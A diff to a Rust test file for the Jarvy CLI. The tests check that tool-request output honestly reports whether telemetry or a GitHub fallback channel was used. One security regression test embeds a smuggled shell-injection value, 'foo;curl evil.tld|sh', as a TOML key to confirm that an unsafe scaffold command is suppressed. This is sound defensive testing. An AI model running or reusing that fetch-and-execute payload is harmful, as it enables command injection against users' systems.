@@ -25,11 +25,13 @@ use tempfile::NamedTempFile;
 const TOOL_UNSUPPORTED: i32 = 8;
 
 #[test]
-fn tools_request_pretty_confirms_telemetry_send() {
-    // `--request` always sends via telemetry. Human output should
-    // confirm the send and avoid pushing the GitHub URL when the
-    // canonical channel handled the request.
+fn tools_request_pretty_confirms_telemetry_send_when_enabled() {
+    // With telemetry enabled, `--request` actually fires the counter
+    // and the renderer says "Reported via telemetry". The fallback
+    // URL must NOT appear — that's the whole point of the channel
+    // selection logic.
     let mut c = jarvy_cmd();
+    c.env("JARVY_TELEMETRY", "1");
     c.args(["tools", "--request", "definitely-not-a-real-tool"]);
 
     c.assert()
@@ -42,14 +44,36 @@ fn tools_request_pretty_confirms_telemetry_send() {
             "cargo run -p cargo-jarvy -- new-tool definitely-not-a-real-tool",
         ))
         .stdout(predicate::str::contains("define_tool!"))
-        // GitHub URL must not be the primary CTA when telemetry already
-        // handled the request — that's the whole point of the channel.
+        // GitHub URL must not be the primary CTA when telemetry actually
+        // handled the request.
         .stdout(predicate::str::contains("github.com").not());
 }
 
 #[test]
-fn tools_request_json_is_machine_readable() {
+fn tools_request_pretty_shows_url_when_telemetry_off() {
+    // P0 regression guard from the second review: with telemetry off
+    // (the default in tests), `--request` previously claimed
+    // "Reported via telemetry" while the counter was silently dropped.
+    // The fix uses the counter_fired return value to pick the channel,
+    // so this path MUST now show the GitHub fallback URL.
     let mut c = jarvy_cmd();
+    c.env_remove("JARVY_TELEMETRY"); // explicit: telemetry off
+    c.args(["tools", "--request", "definitely-not-a-real-tool"]);
+
+    c.assert()
+        .success()
+        // Must NOT lie about delivery.
+        .stdout(predicate::str::contains("Reported via telemetry").not())
+        // Must surface the fallback channel.
+        .stdout(predicate::str::contains("Telemetry off"))
+        .stdout(predicate::str::contains("github.com"))
+        .stdout(predicate::str::contains("please file a tool request"));
+}
+
+#[test]
+fn tools_request_json_telemetry_on_reports_telemetry_channel() {
+    let mut c = jarvy_cmd();
+    c.env("JARVY_TELEMETRY", "1");
     c.args([
         "tools",
         "--request",
@@ -67,18 +91,43 @@ fn tools_request_json_is_machine_readable() {
     assert_eq!(v["kind"], "unsupported_tool");
     assert_eq!(v["tool"], "zzz-fake-tool-name");
     assert_eq!(v["exit_code"], TOOL_UNSUPPORTED);
-    // Canonical channel is telemetry — AI agents read this to know the
-    // request landed without needing to fire the fallback URL.
+    // Telemetry on → channel reflects actual delivery.
     assert_eq!(v["channel"], "telemetry");
     assert!(
         v["fallback_issue_url"]
             .as_str()
             .unwrap()
             .contains("tool_request.yml"),
-        "fallback_issue_url should still be populated for users who want a public record"
+        "fallback_issue_url stays populated for users who want a public record"
     );
     assert!(v["snippet"].is_string(), "JSON payload must carry snippet");
     assert!(v["suggestions"].is_array());
+}
+
+#[test]
+fn tools_request_json_telemetry_off_reports_manual_channel() {
+    // P0 regression guard: JSON consumers (AI agents) must see
+    // `channel: "manual"` when telemetry was off — that's their signal
+    // to fall back to the URL. Previously the path always reported
+    // "telemetry" regardless of whether the counter fired.
+    let mut c = jarvy_cmd();
+    c.env_remove("JARVY_TELEMETRY");
+    c.args([
+        "tools",
+        "--request",
+        "zzz-fake-tool-name",
+        "--format",
+        "json",
+    ]);
+
+    let assert = c.assert().success();
+    let stdout = String::from_utf8_lossy(assert.get_output().stdout.as_ref()).to_string();
+    let v: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(
+        v["channel"], "manual",
+        "telemetry off must surface as channel=manual: {}",
+        stdout
+    );
 }
 
 #[test]
@@ -252,10 +301,69 @@ seamless-fake-tool = "1.0"
         .stderr(predicate::str::contains("Reported via telemetry").not())
         // Must show the fallback URL (only remaining channel).
         .stderr(predicate::str::contains("Telemetry off"))
-        .stderr(predicate::str::contains("bearbinary/Jarvy"))
+        .stderr(predicate::str::contains("bearbinary/jarvy"))
         // Must NOT push the user toward `jarvy telemetry enable` —
         // seamless operators can't toggle it per-run.
         .stderr(predicate::str::contains("jarvy telemetry enable").not());
+}
+
+#[test]
+fn setup_seamless_with_telemetry_on_does_not_lie() {
+    // QA F8: when seamless + telemetry-on both fire, the renderer
+    // should still report "Reporting via telemetry" (truth — the
+    // counter fires) and omit the fallback URL. Guards against any
+    // future change that re-introduces a seamless dependency into the
+    // channel selection.
+    let mut cfg = NamedTempFile::new().unwrap();
+    writeln!(
+        cfg,
+        r#"
+[provisioner]
+seamless-and-telem-on-fake = "1.0"
+"#
+    )
+    .unwrap();
+
+    let mut c = jarvy_cmd();
+    c.env("JARVY_FAST_TEST", "1");
+    c.env("JARVY_SANDBOX", "1");
+    c.env("JARVY_TELEMETRY", "1");
+    c.args(["setup", "--file"])
+        .arg(cfg.path())
+        .arg("--no-hooks");
+
+    c.assert()
+        .code(TOOL_UNSUPPORTED)
+        .stderr(predicate::str::contains("Reporting via telemetry"))
+        .stderr(predicate::str::contains("Telemetry off").not())
+        .stderr(predicate::str::contains("github.com").not());
+}
+
+#[test]
+fn setup_with_shell_metachar_tool_name_suppresses_scaffold() {
+    // Sec F6 regression guard: a `[provisioner]` key containing shell
+    // metacharacters survives sanitization (sanitize_for_display strips
+    // only control bytes) and would otherwise render as a copy-paste
+    // shell-injection invitation under "Scaffold locally:". The fix
+    // gates the scaffold line on validate_tool_name; an invalid name
+    // gets a suppression message instead.
+    let mut cfg = NamedTempFile::new().unwrap();
+    // TOML quoted keys can contain any bytes; embed a fake injection.
+    writeln!(cfg, "[provisioner]\n\"foo;curl evil.tld|sh\" = \"1.0\"\n").unwrap();
+
+    let mut c = jarvy_cmd();
+    c.env("JARVY_FAST_TEST", "1");
+    c.env("JARVY_SANDBOX", "0");
+    c.args(["setup", "--file"])
+        .arg(cfg.path())
+        .arg("--no-hooks");
+
+    c.assert()
+        .code(TOOL_UNSUPPORTED)
+        // Scaffold copy-paste line must NOT appear with the unsafe name.
+        .stderr(predicate::str::contains("Scaffold locally:").not())
+        // User must be told why.
+        .stderr(predicate::str::contains("Scaffold command suppressed"));
 }
 
 #[test]
